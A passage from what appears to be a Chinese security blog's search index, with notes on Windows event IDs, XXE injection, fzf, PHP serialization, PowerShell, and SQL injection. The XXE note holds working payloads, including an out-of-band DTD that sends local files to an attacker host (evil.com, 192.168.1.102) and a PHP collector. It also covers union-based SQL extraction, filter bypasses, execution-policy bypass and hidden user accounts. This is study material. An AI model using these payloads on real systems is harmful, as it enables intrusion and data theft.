后门等。","link":"/2021/05/12/Windows%E5%90%8E%E9%97%A8%E5%8F%8A%E6%8E%92%E6%9F%A5/"},{"title":"Windows 系统事件类型","text":"简介 闲聊 Windows 系统日志 早期版本中 Windows 日志只有，应用程序，安全，系统和 Setup，新的版本中增加了设置及转发事件日志（默认禁用）。 系统内置的三个核心日志文件（System，Security 和 Application）默认大小均为 20480KB（20MB），记录事件数据超过 20MB 时，默认系统将优先覆盖过期的日志记录。其它应用程序及服务日志默认最大为 1024KB，超过最大限制也优先覆盖过期的日志记录。 登录成功不代表一定是 rdp 登录，所有事件的登录类型都是 4624 方法论 通常是通过在事件查看器中：筛选当前日志-&gt;事件 ID 写 4624 等 Windows 事件类型（级别） 级别 含义 信息（Information） 信息事件指应用程序、驱动程序或服务的成功操作的事件。 警告（Warning） 警告事件指不是直接的、主要的，但是会导致将来问题发生的问题。例如，当磁盘空间不足或未找到打印机时，都会记录一个“警告”事件。 错误（Error） 错误事件指用户应该知道的重要的问题。错误事件通常指功能和数据的丢失。例如,如果一个服务不能作为系统引导被加载，那么它会产生一个错误事件。 成功审核（Success audit） 成功的审核安全访问尝试，主要是指安全性日志，这里记录着用户登录/注销、对象访问、特权使用、账户管理、策略更改、详细跟踪、目录服务访问、账户登录等事件，例如所有的成功登录系统都会被记录为“ 成功审核”事件。 失败审核（Failure audit） 失败的审核安全登录尝试，例如用户试图访问网络驱动器失败，则该尝试会被作为失败审核事件记录下来。 事件日志存储位置 类型 事件类型 描述 文件名 Windows 日志 系统 包含系统进程，设备磁盘活动等。事件记录了设备驱动无法正常启动或停止，硬件失败，重复 IP 地址，系统进程的启动，停止及暂停等行为。 System.evtx 安全 包含安全性相关的事件，如用户权限变更，登录及注销，文件及文件夹访问，打印等信息。 Security.evtx 应用程序 包含操作系统安装的应用程序软件相关的事件。事件包括了错误、警告及任何应用程序需要报告的信息，应用程序开发人员可以决定记录哪些信息。 Application.evtx 类型 事件类型 描述 文件名 应用程序及服务日志 Microsoft Microsoft 文件夹下包含了 200 多个微软内置的事件日志分类，只有部分类型默认启用记录功能，如远程桌面客户端连接、无线网络、有线网路、设备安装等相关日志 详见日志存储目录对应文件 Windows PowerShell Windows 自带的 PowerShell 应用的日志信息。 Windows PowerShell.evtx Internet Explorer IE 浏览器应用程序的日志信息，默认未启用，需要通过组策略进行配置。 Internet Explorer.evtx %SystemRoot% 为系统环境变量，默认值在 C:/WINDOWS 事件 ID 及含义 事件 ID 说明 1102 清理审计日志 4624 账号成功登录 4625 账号登录失败 4768 Kerberos 身份验证（TGT 请求） 4769 Kerberos 服务票证请求 4776 NTLM 身份验证 4672 授予特殊权限 4720 创建用户 4726 删除用户 4728 将成员添加到启用安全组的全局组中 4729 将成员从安全的全局组中移除 4732 将成员添加到启用安全的本地组中 4733 将成员从启用安全的本地组中移除 4756 将成员添加到启用安全组的通用组中 4757 将成员从启用安全组的通用组中移除 4719 系统审计策略修改 104 所有审计日志清除事件 4727、4737、4739、4762 表示当用户组发生添加、删除时或组内添加成员时生成该事件 4688 表示创建进程，本地执行 exe 4741 计算机账户已创建 4742 计算机账户已更改 4723 尝试更改账户密码 4724 尝试重置账户密码 4726 用户账户已被删除 4672 使用管理员（或者超级用户）进行登录 五种事件类型中，最为重要的就是成功审核（Success Audit），所有登录成功都会被标注为成功审核 登录类型 描述 说明 2 交互式登录（Interactive） 用户在本地进行登录 3 网络（Network） 常见的情况就是连接到共享文件夹或共享打印机时，如 SMB 爆破——蠕虫病毒 4 批处理（Batch） 通常表示某计划任务正在启动 5 服务（service） 每种服务都被配置在某个特定的用户账号下运行 6 不支持 7 解锁（Unlock） 屏保解锁。 8 网络明文（NetworkCleartext） 登录的密码在网络上是通过明文传输的，如 FTP 9 新凭证（NewCredentials） 使用带/Netonly 参数的 RUNAS 命令运行一个程序 10 远程交互（RemoteInteractive） 通过终端服务、远程桌面或远程协助访问计算机，如 RDP 爆破——勒索病毒 11 缓存交互（CachedInteractive） 以一个域用户登录而又没有域控制器可用 文件共享 ID（端口 445）文件共享对应事件 ID ID 含义 5140 访问了网络共享对象 5141 目录服务对象已删除 5142 添加了网络共享对象 5143 网络共享对象已被修改 5144 网络共享对象已删除 5145 检查网络共享对象以查看是否可以向客户端授予所需的访问权限，及详细的共享访问","link":"/2021/03/12/Windows%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E6%BA%AF%E6%BA%90/"},{"title":"XML External Entity injection(XXE) Summary","text":"XXE 漏洞参考： https://xz.aliyun.com/t/3357 Payload 有回显的 XXE 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY resek4 SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;login&gt;&amp;resek4;&lt;/login&gt; 案例CDATA 特殊字符绕过像最前面的那个例子，可以直接通过 xxe 来爆信息，但是如果信息有例如&lt;&gt;这种的特殊字符，如果直接输出，显然会被解析器解析执行了 所以，当我们遇到要绕过特殊字符将内容回显出来时，我们可以利用 CDATA 来直接输出不被解析原字符串 语法: 12345&lt;![CDATA[XXXXXXXXXXXXXXXXX]]&gt; 但是如果我们单纯的通过一般实体调用，去将 payload 更改为 1234&lt;!ENTITY start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY goodies &quot;file:///d:/1.txt&quot;&gt;&lt;!ENTITY end &quot;]]&gt;&quot;&gt; ]&gt;&lt;creds&gt;&amp;start;&amp;goodies;&amp;end;&lt;/creds&gt; 这样子单纯拼接的话，是会报错的，因为偶我们不能在[[xml]]中直接拼接 但是，我们可以在 DTD 中去拼接，然后通过参数实体调用就好了 payload 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt; evil.dtd 12&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt; 无回显，使用带外数据协议 OOB 带外可以先用**[[DNSlog]]链接** 进行先行测试，来验证目标可以正常访问我们 VPS 的内容 攻击逻辑为：1、客户端发送 payload1 给服务器2、服务器因 remote 实体向 VPS 获取恶意 DTD 文件，3、XML 文件的左右就是调用 payload1 里的 file:///，并组合成一个 send 链接4、payload1 里最后，send 发送 payload1： 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE roottag[&lt;!ENTITY % remote SYSTEM &quot;http://192.168.1.102/test.dtd&quot;&gt;%remote;%int;%send;]&gt; payload2：在攻击机的 web 服务器上托管一个 test.dtd 文件，内容为 12&lt;!ENTITY % file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.1.102/hacker.php?cookie=%file;'&gt;&quot;&gt; 或者在这里链接不写这个，而写 http://evil.com:8001/?p=%file; 这个参数随意，传入的文件也没有，但是可以将数据流传入 VPS 的 8001 端口（或者不加就是默认 80），而在 VPS 端我们可以使用[[NC]]或者[[tcpdump]]来抓取数据 hacker.php 可以这样写 1234&lt;?php$cookie=$_REQUEST['cookie'];file_put_contents('cookie.txt', $cookie);?&gt; 防御 libxml2.9.0 以后，默认不解析外部实体，导致 XXE 漏洞逐渐消亡 使用开发语言提供的禁用外部实体的方法 12//PHP libxml_disable_entity_loader(true); 过滤用户提交的 XML 数据关键词：&lt;!DOCTYPE、&lt;!ENTITY、SYSTEM、PUBLIC 概念关于 XML 可参考[[XML]] 实体引用当标签为 &lt;data&gt;1&lt;2&lt;/data&gt; 时，小于号会导致 XML 报错，所以要使用实体引用：&lt;data&gt;1&amp;lt;2&lt;/data&gt;实体引用表格如下： 实体 符号 &lt; &lt; &gt; &gt; &amp; &amp; ‘ ‘ “ “ 而如果在标签中嵌入非系统预期的符号而导致中断，就可能会引起 XXE 注入 XXEXXE 漏洞全称 XML External Entity Injection 即 XML 外部实体注入 后端代码 123456789&lt;?php$xmlfile=file_get_contents('php://input');//获取客户端输入内容$dom=new DOMDocument();//初始化XML解析器$dom-&gt;loadXML($xmlfile);//加载客户端输入的XML内容$xml=simplexml_import_dom($dom);//获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE。$xxe=$xml-&gt;xxe;$str=&quot;$xxe \\n&quot;;echo $str;//获取SimpleXMLElement对象中的节点XXE，然后输出XXE内容。?&gt; payload 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY evil SYSTEM &quot;file:///d://qwzf.txt&quot;&gt;]&gt;&lt;xml&gt;&lt;xxe&gt;&amp;evil;&lt;/xxe&gt;&lt;/xml&gt; 相当于是因为仗着后端 php 代码可以接收 XML，而未曾禁用传进来 XML 里 DTD 声明中的实体定义，导致我们可以在实体定义中写恶意操作（读文件等），然后传进去的 XML 写个调用恶意操作的实体引用&amp;evil 就完成了。 DTD 在 XML 中定义DTD 像是类定义，XML 中的某一个标签集合（或者一个小标签）都会遵循这个类中所规定的规则（元素数量、内容的类型等）但是这个类声明时候就已经表名要给谁用了（写的是根元素名称，如下面的 address），但是实际调用是如果不牵扯多级元素，根元素名称似乎可以随便写 而 !DOCTYPE 的出现意味着要开始进行 DTD 的声明 DTD 的正常格式是&lt;!类型 元素名称 元素属性 元素内容&gt;，而直接在 XML 中的 DTD 声明可以省略掉属性部分，例如下例： 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot; ?&gt;&lt;!DOCTYPE address [&lt;!ELEMENT address (name,company,phone)&gt; &lt;!ELEMENT name (#PCDATA)&gt; &lt;!ELEMENT company (#PCDATA)&gt; &lt;!ELEMENT phone (#PCDATA)&gt;]&gt;&lt;address&gt; &lt;name&gt;Tanmay Patil&lt;/name&gt; &lt;company&gt;TutorialsPoint&lt;/company&gt; &lt;phone&gt;(011) 123-4567&lt;/phone&gt;&lt;/address&gt; 在 XML 中外部引用 DTD而如果要引用外部 DTD 文件，则 DTD 文件中可以直接写 123451.dtd&lt;!ELEMENT address (name,company,phone)&gt;&lt;!ELEMENT name (#PCDATA)&gt;&lt;!ELEMENT company (#PCDATA)&gt;&lt;!ELEMENT phone (#PCDATA)&gt; 然后在 XML 中，头部声明完成后紧跟 DTD 声明 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot; ?&gt;&lt;!DOCTYPE address SYSTEM &quot;1.dtd&quot;&gt;&lt;address&gt; &lt;name&gt;Tanmay Patil&lt;/name&gt; &lt;company&gt;TutorialsPoint&lt;/company&gt; &lt;phone&gt;(011) 123-4567&lt;/phone&gt;&lt;/address&gt; 当引用的 DTD 文件是本地文件的时候，用 SYSTEM 标识，并写上”DTD 的文件路径”，如下： 1&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt; 如果引用的 DTD 文件是一个公共的文件时，采用 PUBLIC 标识 1&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文件的URL&quot;&gt; DTD 实体 一般元素内容是 ELEMENT 12&lt;!ELEMENT name (#PCDATA)&gt; #PCDATA表示此元素可以接收文本文件 &lt;!ELEMENT name ANY&gt; ANY表示可以接收任意类型文件 而 ENTITY 实体 是包含外部文件时用的，两者可以在 DTD 中出现，更理所应当能在 XML 中出现 ENTITY 实体从引用位置分为两类： 内部实体 即在 XML 中头部那块直接定义实体内容与名称，后续直接使用 123456&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY writer &quot;Dawn&quot;&gt; &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;]&gt;&lt;test&gt;&amp;writer;©right;&lt;/test&gt; 外部实体 类似于引用外部的 DTD 文件，且那个外部 DTD 文件里边还包含了引入的外部资源 引用外部实体时可以使用 PHP 伪协议 123456&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;]&gt;&lt;author&gt;&amp;file;©right;&lt;/author&gt; ENTITY 实体从引用方式分为两类： 引用实体，主要在 XML 文档中被应用，格式： 12&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;引用方式：&amp;实体名称;末尾要带上分号，这个引用将直接转变成实体内容,如上例 参数实体，被 DTD 文件自身使用 ，格式： 1234567891011&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;引用方式为：%实体名称 %file(参数实体)是在DTD中被引用的，而&amp;file;是在xml文档中被引用的，例如：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt; %file;]&gt;","link":"/2021/01/11/XXE/"},{"title":"fzf(Fuzzy File Finder) enhances the efficiency and convenience of your command-line workflow.","text":"Installation of fzf123456# Install the fzf itself by Homebrewbrew install fzf# Install the auto-completion and the key bindings# Add the .fzf.zsh which contains the configuration of these downloaded files to the .bashrc and the .zshrc$(brew --prefix)/opt/fzf/install The .fzf.zsh file default contents are these below: key-bindings.zsh only contains CTRL-R, CTRL-T, and ALT-C12345678910111213# Setup fzf# ---------if [[ ! &quot;$PATH&quot; == */opt/homebrew/opt/fzf/bin* ]]; then PATH=&quot;${PATH:+${PATH}:}/opt/homebrew/opt/fzf/bin&quot;fi# Auto-completion# ---------------[[ $- == *i* ]] &amp;&amp; source &quot;/opt/homebrew/opt/fzf/shell/completion.zsh&quot; 2&gt; /dev/null# Key bindings# ------------source &quot;/opt/homebrew/opt/fzf/shell/key-bindings.zsh&quot; Link with NeoVIMInstallation(init.vim) If there is no fzf binary files have been installed before, We should install fzf separately in NeoVim(By Vim-Plug or something else).Otherwise, we could only specify the fzf pathname in our local drive which is enough.1234567&quot; If there is no fzf binary files beforePlug 'junegunn/fzf', { 'do': { -&gt; fzf#install() } }Plug 'junegunn/fzf.vim'&quot; If fzf has been installed at the local drivePlug '/opt/homebrew/opt/fzf'Plug 'junegunn/fzf.vim' Configuration(init.vim)123456789101112131415let $FZF_DEFAULT_OPTS=&quot;--height 40% --border --preview 'bat --style=numbers --color=always --line-range :500 {}'&quot;command! -bang -nargs=? -complete=dir Files call fzf#vim#files('~/', &lt;bang&gt;0)nnoremap &lt;C-f&gt; :Files&lt;CR&gt;command! -bang -nargs=* MRU call fzf#vim#history(fzf#vim#with_preview())noremap &lt;C-h&gt; :MRU&lt;CR&gt;command! -bang -nargs=* Ag \\ call fzf#vim#ag( \\ '', \\ &lt;bang&gt;0 ? fzf#vim#with_preview('up:60%') \\ : fzf#vim#with_preview('right:50%', '?'), \\ &lt;bang&gt;0)noremap &lt;C-c&gt; :Ag&lt;CR&gt; There are defined 3 keybindings(CTRL-f, CTRL-h, CTRL-c), and Ag was used software installed in our local drive called The silver searcher (GitHub - ggreer/the_silver_searcher: A code-searching tool similar to ack, but faster.)","link":"/2022/12/31/fzf/"},{"title":"php 详解序列化及反序列化特征","text":"概述 php 在定义一个数组，类等很多东西的时候，为了数据传递的方便，都可以对一个对象或者实例进行序列化 对一个数组进行序列化 12345678&lt;?php$sites = array('Google', 'Runoob', 'Facebook');$serialized_data = serialize($sites);echo $serialized_data . PHP_EOL;?&gt;//输出结果a:3:{i:0;s:6:&quot;Google&quot;;i:1;s:6:&quot;Runoob&quot;;i:2;s:8:&quot;Facebook&quot;;} 对一个类进行序列化 12345678910111213&lt;?php class F{ public $filename='a.txt';}$a = new F();echo $a-&gt;filename.'&lt;br /&gt;';echo serialize($a);?&gt;//输出结果a.txtO:1:&quot;F&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;a.txt&quot;;} 序列化格式拿上面这个类的序列化进行举例 1O:1:&quot;F&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;a.txt&quot;;} O 序列化对象的类型，其中有 类型 解释 a 数组 b 布尔值 d 双精度浮点型 i 整型 o 普通对象 r 引用 s 字符串 C 自定义对象 O 类 N null值 R 指针引用 U Unicode 字符串 1 序列化的类名的（字符串）长度 &quot;F&quot; 是类名本身（字符串形式） 1 是这个类中属性（变量）的数量 {s:8:”filename”} 中 s 代表属性名（字符串）的类型 {s:8:”filename”} 中 8 代表属性名（字符串）的长度 {s:8:”filename”} 中 filename 代表属性名（字符串）本身 {s:5:”a.txt”} 中 s 代表属性值（字符串）的类型 {s:5:”a.txt”} 中 5 代表属性值（字符串）的长度 {s:5:”a.txt”} 中 a.txt 代表属性值（字符串）本身 序列化结束后的属性内容最后是有一个分号的 序列化的访问控制修饰符造成的影响 protected 属性被序列化的时候 属性名 会变成 %00*%00属性名 private 属性被序列化的时候 属性名 会变成 %00类名%00属性名 例如： 1234567891011121314&lt;?php class Ctf{ public $name='Sch0lar'; protected $age='19'; private $flag='get flag'; } $ctfer=new Ctf(); //实例化一个对象 echo serialize($ctfer);?&gt;//输出结果O:3:&quot;Ctf&quot;:3:{s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:6:&quot;*age&quot;;s:2:&quot;19&quot;;s:9:&quot;Ctfflag&quot;;s:8:&quot;get flag&quot;;}//因为 protected 的影响，序列化后的 s:6:&quot;*age&quot; 星号前后有两个不可见的空格//因为 private 的影响，序列化后的 s:9:&quot;Ctfflag&quot; 会以空格（不可见） + 类名 + 空格（不可见） + 类名 构成 魔术方法 魔术方法是不算在序列化中属性内容或属性数量里边的 序列化特别的魔术方法- __sleep() 如果在序列化类的时候，发现其中有特殊的魔术方法，则会触发不同的序列化效果 该方法决定了类中那些属性需要被序列化。如果有此方法，未指明的属性将不会被序列化，若无此方法，则默认全部序列化 如果有 __sleep() 方法时，序列化时该方法最先被调用 例如： 123456789101112131415161718&lt;?php class Ctf{ public $flag='flag{****}'; public $name='cxk'; public $age='10'; public function __sleep(){ return array('flag','age'); } } $ctfer=new Ctf(); $ctfer-&gt;flag='flag{abedyui}'; $ctfer-&gt;name='Sch0lar'; $ctfer-&gt;age='18' echo serialize($ctfer);?&gt;//输出结果，只序列化__sleep()声明 flag 和 ageO:3:&quot;Ctf&quot;:2:{s:4:&quot;flag&quot;;s:13:&quot;flag{abedyui}&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;} 反序列化特别的魔术方法- __wakeup() 序列化时不会调用，反序列化时检测到此魔术方法，便会依据该方法内的改变，对类中的属性信息（包括属性名，属性值）进行变更 如果有 __wakeup() 方法时，反序列化时该方法最先被调用 例如： 12345678910111213141516171819202122232425262728&lt;?php class Ctf{ public $flag='flag{****}'; public $name='cxk'; public $age='10'; public function __wakeup(){ $this-&gt;flag='no flag'; //在反序列化时，flag属性将被改变为“no flag” } } $ctfer=new Ctf(); //实例化一个对象 $ctfer-&gt;flag='flag{adedyui}'; $ctfer-&gt;name='Sch0lar'; $ctfer-&gt;age='18' $str=serialize($ctfer); echo '&lt;pre&gt;'; var_dump(unserialize($str));?&gt;//输出结果object(Ctf)#2 (3) { [&quot;flag&quot;]=&gt; string(13) &quot;no flag&quot; [&quot;name&quot;]=&gt; string(7) &quot;Sch0lar&quot; [&quot;age&quot;]=&gt; string(2) &quot;18&quot;}","link":"/2022/02/25/php%20%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"php 魔术方法总结","text":"概述PHP: 魔术方法 - Manual php 魔术方法是一种特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作 __construct() 构造函数 通常构造方法被用来执行一些有用的初始化任务，如对成员属性在创建对象时赋予初始值 在每个类中都有一个构造方法，如果没有显示地声明它，那么类中都会默认存在一个没有参数且内容为空的构造方法 例如： 1234567891011121314151617181920212223242526&lt;?class Person{ public $name; public $age; public $sex; public function __construct($name = &quot;&quot;, $sex = &quot;男&quot;, $age = 22) { $this-&gt;name = $name; $this-&gt;sex = $sex; $this-&gt;age = $age; } public function say() { echo &quot;我叫：&quot;.this-&gt;name.&quot;，性别：&quot;.$this-&gt;sex.&quot;，年龄：&quot;.$this-&gt;age; }}$Person = new Person();echo $Person-&gt;say();?&gt;//输出结果我叫：张三，性别：男，年龄：22 __destruct() 析构函数 php 的执行工作流是当前端进程调用后端的 php 程序阶段性完成时（例如页面加载完成，调用 php 也结束了），其中类就会逐一销毁，而该函数可以在销毁之前执行一些关闭文件，释放内存等结束性操作 例如： 123456789101112131415&lt;?phpclass Person{ public $name; public function __destruct() { echo &quot;waiting!&quot; }}$Person = new Person();unset($Person); //手动销毁Person对象，注意这个不是__unset()重载方法?&gt;//输出结果waiting! 重载方法属性重载__set() 在给不可访问（ protected 或 private ）或不存在的属性赋值时，__set() 会被调用。 __get() 读取不可访问（ protected 或 private ）或不存在的属性的值时，__get()会被调用。 __isset() 当对不可访问（ protected 或 private ）或不存在的属性调用 isset() 或 empty() 时，__isset() 会被调用。 __unset() 当对不可访问（ protected 或 private ）或不存在的属性调用 unset() 时，__unset() 会被调用。 方法重载__call()在对象中调用一个不可访问方法时，__call() 会被调用。 __callStatic()在静态上下文中调用一个不可访问方法时，__callStatic() 会被调用。 __toString() 被当作字符串时调用方法 该方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。例如：12345678910111213141516171819202122&lt;?php // 声明一个简单的类 class TestClass { public $foo; public function __construct($foo) { $this-&gt;foo = $foo; } public function __toString() { return $this-&gt;foo; } } $class = new TestClass('Hello'); echo $class; ?&gt;//输出结果Hello __invoke() 方法 当尝试以调用函数的方式调用一个对象时，该方法会被自动调用 例如： 123456789101112131415&lt;?php class CallableClass { function __invoke($x) { var_dump($x); } } $obj = new CallableClass; $obj(5); var_dump(is_callable($obj)); ?&gt;//输出结果int(5)bool(true) __sleep() 序列化特指方法![[php 序列化及反序列化#序列化特别的魔术方法- __sleep()]] __wakeup() 反序列化变更方法![[php 序列化及反序列化#反序列化特别的魔术方法- __wakeup()]]","link":"/2022/02/25/php%20%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"},{"title":"A simple summary of Powershell Script","text":"powshell 学习0x00.基本 cmd 的命令在 ps 里都能用 可以直接进行计算 可以属性调色 可以用 tab 键补全命令 可以使用管道符(|)将上一个命令的输出放到下一个命令的输入里去 可以使用&gt;（覆盖）,&gt;&gt;（追加） 的重定向符 动名词方式来使用命令，例如 get-process get-services 变量和 php 很类似又$开头 变量可以是命令变量不需要提前声明 条件语句没分号 可以单双引号互相嵌套 转义不再是 \\，而是 ` ![[CMD下执行ps1脚本]] 0x01.其他打开可以调用脚本程序权限1234567891011121314脚本权限通过 -executionpolicy 更改获取使用get-executionpolicy有以下几个：Restricted 脚本不能运行(默认)RemoteSigned 本地创建的可运行，网上下载的不行（除非有证书）Allsigned 有受信任者颁发的签名才能运行Unrestricted 全能运行使用-executionpolicy bypass 来绕过安全策略set-executionpolicy RemoteSigned #选择全是（a）管理员运行cmd，输入powershell进去再次执行 set-executionpolicy RemoteSigned 就好了 运行脚本程序时用 .\\1.bat 或者 .\\1.ps1 的方式 从软件设置更改 Powershell 默认路径1、在文档目录下新建一个文件夹，命名为 WindowsPowerShell 2、在刚建立的 WindowsPowerShell 里边新建一个文件，叫做 profile.ps1 3、编辑 profile.ps1 写入 1set-location C:\\Users\\... //你的默认路径 并保存 4、管理员模式打开 Powershell，输入 123set-executionpolicy remotesigned然后输入Y，回车 重启 Powershell 就更改完成了 0x02.账户相关Windos 下的用户账号信息是在 C: \\Windows\\system32\\config\\SAM 里边的 查看当前用户的 SID 1whoami /user 用户 Windows 默认账户是 Administrator，Guest 账户是默认关闭的 基本命令 12345net user //查看系统账户net user resek4 //查看用户的属性信息net user resek4 123456 /add //添加一个用户名是resek4，密码是123456的Guest用户net user resek4$ 123456 /add //添加一个用户名是resek4的隐藏用户net user resek4 /del //删除resek4用户 用户组 Administrators 组内的用户，都具备系统管理员的权限 Guests 是提供给没有用户账户但是需要访问本地计算机资源的用户使用的Users 组内的成员只拥有一些运行程序的权利，但是不能更改设置，不能关闭计算机Power Users 组内成员权利多于 Users，少于 AdministratorsRemote Desktop 组内的成员拥有远程登录权限（Administrator 是默认就有的） 基本命令 123456net localgroup //查看系统和组net localgroup resek //查看resek组内的成员net localgroup resek /add //添加一个叫resek的组net localgroup resek resek4 /add //向resek组里添加一个resek4的用户net localgroup resek resek4 /del //删除resek组里resek4成员net localgroup resek /del //删除resek组 0x03.命令基本命令12345678910111213141516171819202122232425262728293031323334353637383940414243$psversiontable #powershell每个windows版本有区别，这个命令可以看powershell的版本get-service #获取计算机详细的服务及状态#等同于在cmd里输入service.mscget-process #获取所有进程信息get-alias #获取当前会话的别名get-history #获取输入命令历史get-date #获取时间get-command #获取所有命令#也可使用gcm别名get-childitem #获取当前目录的所有文件信息，等同于dir，lsls | format-table name,mode #将ls里的name与mode格式化输出 ls | format-table name,mode &gt; 1.txt #将输入内容重定向到1.txt里边type 1.txt #打印内容到屏幕上 netstat -ano #打印所有网络信息route print #打印所有路由信息start notepad #打开记事本，所有放在windows/system32 里的文件都可以被打开 $env.path #输出系统变量$env:windir #打印某个环境变量的值ls variable #查看当前test-path variable:num1 #查找变量是否存在 del variable:num1 #删除变量$pid #打印当前进程的pid [environment]::setenvironmentvariable(&quot;PATH&quot;,&quot;E:\\&quot;,&quot;User&quot;) #永久增加用户的环境变量 基本运算及函数1234567891011121314151617181920212223242526#条件判断if(){} else{}if(){} elseif(){} else{}# 定义数组$arr=1..10$arr=1,2,3,4,5,6,7,8,9,10#也可以将ipconfig等命令赋值给一个数组，然后后期间接输出#循环foreach($i in $arr){}while(){}do{}while()#自定义函数function test(){}read-host &quot;&quot; #读取用户输入，未来输出可以直接在引号里放变量$str.split(&quot;\\&quot;).gettype()split()可分隔信息，gettype()可打印信息#获取字符串图片名称$str=&quot;https://www.abc.com/haha/hello.png&quot;$str.split(&quot;\\&quot;)[-1] 即可获得hello.png 别名12345678910get-alias -name ls#获取ls别名，即会回显get-childitemget-alias | where{$_.definition.startswitch(&quot;Remove&quot;)}# $_表示当前的元素，definition 定义一个字符串数组类型。Powershell支持.net强大的类库，里面的definition包括字符串startswith操作，获取字符串开头函数。set-alias -name notepad -value pad #将notepad的别名设置为pad,关闭ps就会失效del alias:pad #删除别名export-alias 1.ps #保存别名 0x04.注册表相关 HKEY_CLASSES_ROOT：定义文档的类型\\类以及与类型关联的信息以及 COM 组件的配置数据 HKEY_CURRENT_USER：包含当前登录到 Windows 的用户的配置信息 HKEY_LOCAL_MACHINE：包含与计算机相关的配置信息,不管用户是否登录 HKEY_USERS：包含有关默认用户配置的信息 HKEY_CURRENT_CONFIG：包含有关非用户特定的硬件的配置信息 123456789可以直接cd hkcu:来进入hkcu注册表，ls即可打印# 读取键值get-itemproperty#设置键值set-itemproperty","link":"/2020/11/02/powershell/"},{"title":"SQL Injection Hacking Flow","text":"sql 注入步骤0x00.判断注入点1.如果目标有 get 注入，则会在 url 上有明显传参的注入点，比方说： 1/index.php?id=1 如果没有在目标 url 上发现明显的 get 注入，则很有可能是 post 注入，在 post 里边传参就好了 2.通过在传参的数字或是字符串后边加单引号，看会不会框架还在但数据不在了，再加上井号，看不在的数据会不会恢复，以此来判断是否有注入点 3.如果第二步不成功，可以使用 id=1 and 1=1 与 id=1 and 1=2 来看两次页面是否有不同的回显，有的话说明 and 后的语句被执行了，有注入。 4.个别情况，可以使用 id=1 and sleep(5)来看，如果有 5 秒延迟，说明有注入。 0x01.使用 order by 语句来判断列数1id=1' order by 4%23 可以使用二分法来推测列数 0x02.判断回显点从此时开始，就要使 url 前面的查询失效，只执行你 union select 的语句方法是传一个错误数据将前面的查询失效，可以是 0 可以是负数 1id=-1' union select 1,2,3,4%23 找到回显点以后，可以使用 database(),user(),version()等函数来证明回显点的可用性 0x03.查询数据库名 可以使用 group_concat()函数来将多列数据整合到一列 1id=-1' union select 1,2,(select group_concat(schema_name) from information_schema.schemata),4%23 0x04.查询表名1id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=0x746573745f736368656d61),4%23 查询表名时只需要做一次 where 限制，但是限制名字一定要用十六进制表示，并加上 0x 0x05.查询列名1id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=0x746573745f736368656d61 and table_name=0x746573745f7461626c65),4%23 查询列名时需要做两次 where 限制，一次是 table_schema（表的数据库名），一次是 table_name（表的名字），且都要用十六进制表示 0x06.查询数据12id=-1' union select 1,2,(select group_concat(id,0x7c,password) from test_schema.test_table),4%23（不对可以尝试将test.schema的这个前缀去掉） 在 group_concat()里写入要查询数据的列名，from 的表名也直接可以用无需转进制的本名表示了（数据库名.表名） 而且由此可见，group_concat 函数里可以通过加上十六进制的特殊符号来分隔列名，以达到分隔要查询的数据的效果 sql 注入技巧 Bypass: (1)单引号或者别的什么字符：十六进制编码('abc'==0x616263)(2)空格：/**/ (3)关键字：预编译语句替换(4)and 或 or：&amp;&amp; || 或者将 and 或 or 用 ascii 编码后加上%（即变成字母的 url 编码进行绕过）(5)’!=’：’&lt;&gt;’(6)’=’id = 1：id between 1 and 1like 0x00.Tips sql 可以使用写文件 12345select 